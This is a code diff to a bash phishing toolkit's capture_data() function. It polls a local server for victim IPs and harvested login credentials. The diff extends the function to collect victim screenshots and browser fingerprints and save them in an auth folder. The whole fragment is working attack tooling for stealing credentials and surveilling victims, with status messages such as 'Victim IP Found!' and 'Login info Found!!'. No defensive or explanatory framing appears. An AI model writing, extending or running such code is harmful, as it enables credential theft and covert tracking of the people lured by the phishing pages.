@@ -373,21 +373,42 @@ capture_creds() {
 	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
 }
 
-## Print data
+## Collect credentials & victim IP
 capture_data() {
 	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
 	while true; do
 		if [[ -e ".server/www/ip.txt" ]]; then
-			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
+			echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found!"
 			capture_ip
 			rm -rf .server/www/ip.txt
 		fi
 		sleep 0.75
 		if [[ -e ".server/www/usernames.txt" ]]; then
-			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
+			echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found!!"
 			capture_creds
 			rm -rf .server/www/usernames.txt
 		fi
+		sleep 0.75
+		
+		# Check for screenshots
+		if [[ -d ".server/www/screenshots" ]]; then
+			screenshot_count=$(ls -1 .server/www/screenshots/*.jpg 2>/dev/null | wc -l)
+			if [[ $screenshot_count -gt 0 ]]; then
+				echo -ne "\n${RED}[${WHITE}-${RED}]${CYAN} Screenshots Captured: ${ORANGE}$screenshot_count${WHITE}"
+				# Move to auth directory
+				mkdir -p auth/screenshots
+				cp -r .server/www/screenshots/* auth/screenshots/ 2>/dev/null
+			fi
+		fi
+		
+		# Check for fingerprints
+		if [[ -e ".server/www/fingerprints.txt" ]]; then
+			echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Browser Fingerprint Captured!"
+			echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in: ${ORANGE}auth/fingerprints.txt${WHITE}"
+			cat .server/www/fingerprints.txt >> auth/fingerprints.txt
+			rm -rf .server/www/fingerprints.txt
+		fi
+		
 		sleep 0.75
 	done
 }
